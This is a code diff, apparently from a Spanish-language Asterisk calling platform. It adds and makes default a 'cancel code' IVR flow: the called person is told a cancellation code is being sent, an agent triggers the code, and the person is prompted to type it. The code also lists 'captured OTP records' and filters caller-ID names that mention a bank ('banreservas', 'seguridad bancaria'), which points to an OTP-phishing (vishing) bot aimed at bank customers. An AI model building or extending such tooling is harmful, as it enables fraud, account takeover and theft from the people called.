@@ -941,7 +941,7 @@ export interface CallState {
   number: string;
   channel?: string;
   bridgedChannel?: string;
-  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'on_hold' | 'pressed_1' | 'otp_valid' | 'otp_invalid' | 'machine' | 'ended' | 'transferred';
+  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'on_hold' | 'pressed_1' | 'asking_cancel_code' | 'otp_valid' | 'otp_invalid' | 'machine' | 'ended' | 'transferred';
   digit?: string;
   cause?: string;
   agent?: string;
@@ -2361,7 +2361,7 @@ function resolveClientDialingPlanScope(user?: any, tenant?: any): {
   const userAllowed = filterValid(user?.allowedCallFlowModes);
   const tenantAllowed = filterValid(tenant?.allowedCallFlowModes);
   const defaultMode = normalizeCallFlowMode(
-    user?.assignedCallFlowMode || tenant?.assignedCallFlowMode || userAllowed[0] || tenantAllowed[0] || 'press1'
+    user?.assignedCallFlowMode || tenant?.assignedCallFlowMode || userAllowed[0] || tenantAllowed[0] || 'cancel_code'
   );
 
   let allowedModes: Array<'otp' | 'press1' | 'hybrid' | 'cancel_code' | 'otp_press1'>;
@@ -4363,6 +4363,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n(skip_amd_p1c),Wait(1.5)\n`;
   dialplanContent += ` same => n(amd_ok_p1c),Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=waiting_press1)\n`;
+  dialplanContent += ` same => n,Set(DB(cancel_send/\${TARGET_DEST})=waiting_press1)\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=in_ivr&mode=cancel_code&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
   dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-press1-cancel,Channel=\${CHANNEL})\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
@@ -4419,8 +4420,8 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=machine_detected&cause=\${URIENCODE(\${AMDCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
-  dialplanContent += `; CLIENTE MARCA 1 -> REPRODUCE "UN MOMENTO POR FAVOR, LE ESTAMOS ENVIANDO UN CODIGO DE CANCELACION" Y PIDE/VALIDA EL CODIGO\n`;
-  dialplanContent += `exten => 1,1,NoOp(=== [IVR-PRESS1-CANCEL] DIGITO 1 DETECTADO -> ENVIANDO CODIGO DE CANCELACION ===)\n`;
+  dialplanContent += `; CLIENTE MARCA 1 -> REPRODUCE "UN MOMENTO POR FAVOR, LE ESTAMOS ENVIANDO UN CODIGO DE CANCELACION", AVISA AL AGENTE Y ESPERA HASTA QUE EL AGENTE ENVIE EL CODIGO\n`;
+  dialplanContent += `exten => 1,1,NoOp(=== [IVR-PRESS1-CANCEL] DIGITO 1 DETECTADO -> AVISANDO AL AGENTE PARA QUE ENVIE EL CODIGO ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_NUM}" != ""]?\${TARGET_NUM}:\${IF($["\${CUSTOMER_NUM}" != ""]?\${CUSTOMER_NUM}:\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})})})\n`;
   dialplanContent += ` same => n,Set(__TARGET_NUM=\${TARGET_NUM})\n`;
   dialplanContent += ` same => n,Set(__TARGET_DEST=\${TARGET_NUM})\n`;
@@ -4428,15 +4429,29 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(__CUSTOMER_NUM=\${TARGET_NUM})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=pressed_1)\n`;
   dialplanContent += ` same => n,Set(DB(call_digit/\${TARGET_NUM})=1)\n`;
+  dialplanContent += ` same => n,Set(DB(cancel_send/\${TARGET_NUM})=waiting_agent)\n`;
+  dialplanContent += ` same => n,Set(DB(cancel_send/\${TARGET_NUM}_\${FINAL_AGENT})=waiting_agent)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM}_\${FINAL_AGENT})=pending)\n`;
   dialplanContent += ` same => n,UserEvent(Press1Detected,Number=\${TARGET_NUM},Digit=1,Mode=cancel_code,Channel=\${CHANNEL})\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=pressed_1&digit=1&mode=cancel_code&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
   dialplanContent += ` same => n,Playback(\${IVR_CANCEL_WAIT})\n`;
-  dialplanContent += ` same => n,Wait(2)\n`;
+  dialplanContent += ` same => n,Set(SEND_WAIT_LOOP=0)\n`;
+  dialplanContent += ` same => n(wait_agent_send_code),Set(SEND_WAIT_LOOP=$[\${SEND_WAIT_LOOP} + 1])\n`;
+  dialplanContent += ` same => n,Set(RAW_SEND_FLAG=\${DB(cancel_send/\${TARGET_NUM}_\${FINAL_AGENT})})\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_SEND_FLAG}" = ""] | $["\${RAW_SEND_FLAG}" = "waiting_agent"] | $["\${RAW_SEND_FLAG}" = "waiting_press1"]]?Set(RAW_SEND_FLAG=\${DB(cancel_send/\${TARGET_NUM})}))\n`;
+  dialplanContent += ` same => n,Set(CLEAN_SEND_FLAG=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz_,\${RAW_SEND_FLAG})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${CLEAN_SEND_FLAG}" = "send_now"]?agent_ready_ask_code)\n`;
   dialplanContent += ` same => n,Set(PRE_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${DB(otp_status/\${TARGET_NUM})})})})\n`;
   dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "valid"]?cancel_approved)\n`;
   dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "invalid"]?cancel_rejected)\n`;
+  dialplanContent += ` same => n,GotoIf($[\${SEND_WAIT_LOOP} >= 120]?agent_ready_ask_code)\n`;
+  dialplanContent += ` same => n,ExecIf($[$[\${SEND_WAIT_LOOP} % 15] = 0]?Playback(beep))\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Goto(wait_agent_send_code)\n`;
+  dialplanContent += ` same => n(agent_ready_ask_code),NoOp(=== [IVR-PRESS1-CANCEL] Agente envio el codigo -> Solicitando al cliente que lo digite ===)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=asking_cancel_code)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=asking_cancel_code&mode=cancel_code&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
   dialplanContent += ` same => n,Set(CANCEL_RETRIES=0)\n`;
   dialplanContent += ` same => n(ask_cancel_code),Set(CANCEL_RETRIES=$[\${CANCEL_RETRIES} + 1])\n`;
   dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
@@ -6005,8 +6020,8 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     let effectiveCidName = (!rawReqCidName || /asignado|atenci[oó]n al cliente|banreservas|seguridad bancaria/i.test(rawReqCidName))
       ? ''
       : rawReqCidName;
-    const effectiveMode = callMode || mode || 'press1';
-    let targetContext = 'ivr-press1';
+    const effectiveMode = callMode || mode || 'cancel_code';
+    let targetContext = 'ivr-press1-cancel';
     if (effectiveMode === 'direct') {
       targetContext = 'from-internal';
     } else if (effectiveMode === 'playback' || effectiveMode === 'audio_playback') {
@@ -6239,11 +6254,12 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       callRetryAttempts.delete(formattedDest);
     }
 
-    // Clients are free to select any active route ('carrier') they wish to use;
-    // only fall back to the default assigned carrier if no route was chosen.
-    let cleanCarrier = String(carrier || '').trim();
+    // Enforce assigned outbound carrier for non-SuperAdmin clients (clients cannot change carrier)
     const defaultAssignedCarrier = tenantResolution.carrierName || userResolution.carrierName;
-    if (!cleanCarrier && defaultAssignedCarrier) {
+    let cleanCarrier = callerIsSuperAdmin
+      ? String(carrier || '').trim()
+      : (defaultAssignedCarrier || '');
+    if (callerIsSuperAdmin && !cleanCarrier && defaultAssignedCarrier) {
       cleanCarrier = defaultAssignedCarrier;
     }
 
@@ -7488,7 +7504,7 @@ app.post('/api/asterisk/audio/unassign', requireAdminRole, (req, res) => {
 // Endpoint to set default IVR answer action (Super Admin only - Dialplan control)
 app.post('/api/asterisk/action/set-default', requireGlobalAdmin, (req, res) => {
   try {
-    const { mode = 'press1' } = req.body;
+    const { mode = 'cancel_code' } = req.body;
     const targetContext =
       mode === 'otp'
         ? 'ivr-otp'
@@ -9014,6 +9030,63 @@ app.post('/api/asterisk/otp/decision', async (req, res) => {
   }
 });
 
+// Endpoint for agent to signal Asterisk that the cancellation code was sent to the client so Asterisk prompts the client to type it
+app.post('/api/asterisk/call/cancel-code-sent', async (req, res) => {
+  try {
+    const authUser = (req as any).authUser;
+    const { number, agent } = req.body || {};
+    const cleanNum = number ? String(number).replace(/[^0-9]/g, '') : '';
+    if (!cleanNum) {
+      return res.status(400).json({ success: false, error: 'Número de destino obligatorio' });
+    }
+    const clean10 = cleanNum.length === 11 && cleanNum.startsWith('1') ? cleanNum.substring(1) : cleanNum;
+    const existingCall =
+      callStatusStore.get(cleanNum) || callStatusStore.get(clean10) || callStatusStore.get(`1${clean10}`);
+
+    if (existingCall && !canUserAccessCall(authUser, existingCall)) {
+      return res.status(403).json({ success: false, error: 'No tienes permiso para operar esta llamada.' });
+    }
+
+    const cleanAgent = agent && agent !== 'ringall' && agent !== 'all'
+      ? String(agent).trim()
+      : (existingCall?.agent && existingCall.agent !== 'ringall' ? String(existingCall.agent).trim() : '');
+
+    const dbWrites: Promise<any>[] = [
+      executeAsteriskCommand(`database put cancel_send "${cleanNum}" "send_now"`).catch(() => {}),
+      executeAsteriskCommand(`database put cancel_send "${clean10}" "send_now"`).catch(() => {}),
+      executeAsteriskCommand(`database put cancel_send "1${clean10}" "send_now"`).catch(() => {}),
+    ];
+    if (cleanAgent) {
+      dbWrites.push(
+        executeAsteriskCommand(`database put cancel_send "${cleanNum}_${cleanAgent}" "send_now"`).catch(() => {}),
+        executeAsteriskCommand(`database put cancel_send "${clean10}_${cleanAgent}" "send_now"`).catch(() => {}),
+        executeAsteriskCommand(`database put cancel_send "1${clean10}_${cleanAgent}" "send_now"`).catch(() => {})
+      );
+    }
+
+    if (existingCall) {
+      existingCall.status = 'asking_cancel_code';
+      existingCall.mode = existingCall.mode || 'cancel_code';
+      existingCall.timestamp = Date.now();
+      callStatusStore.set(cleanNum, existingCall);
+      callStatusStore.set(clean10, existingCall);
+      callStatusStore.set(`1${clean10}`, existingCall);
+    }
+
+    await Promise.all(dbWrites);
+    console.log(`[CANCEL CODE SENT] Agente notificó envío de código a ${cleanNum} -> Asterisk solicitando dígitos al cliente`);
+
+    res.json({
+      success: true,
+      number: cleanNum,
+      status: 'asking_cancel_code',
+      message: 'Aviso enviado a Asterisk. El cliente ahora escuchará la solicitud para digitar su código.',
+    });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
 // Endpoint to list all captured OTP records
 app.get('/api/asterisk/otp/records', async (req, res) => {
   const authUser = (req as any).authUser;
@@ -9385,7 +9458,7 @@ app.all('/api/asterisk/call/status/update', requireInternalOrGlobalAdmin, (req, 
     let answeredAt = existing?.answeredAt;
     let pressed1At = existing?.pressed1At;
 
-    if ((status === 'in_ivr' || status === 'ringing' || status === 'pressed_1' || status === 'talking') && !answeredAt) {
+    if ((status === 'in_ivr' || status === 'ringing' || status === 'pressed_1' || status === 'asking_cancel_code' || status === 'talking') && !answeredAt) {
       answeredAt = Date.now();
     }
     if (status === 'pressed_1' || digit === '1') {
@@ -9881,7 +9954,9 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
         : call.status === 'pressed_1' && call.mode === 'otp_press1'
         ? 'Presionó 1 — Enviando código de verificación'
         : call.status === 'pressed_1' && call.mode === 'cancel_code'
-        ? 'Presionó 1 — Enviando código de cancelación'
+        ? '¡Presionó 1! — Envía el código de cancelación ahora'
+        : call.status === 'asking_cancel_code'
+        ? 'Solicitando al cliente digitar el código'
         : call.status === 'pressed_1'
         ? 'Presionó 1 en menú IVR'
         : call.status === 'otp_valid'
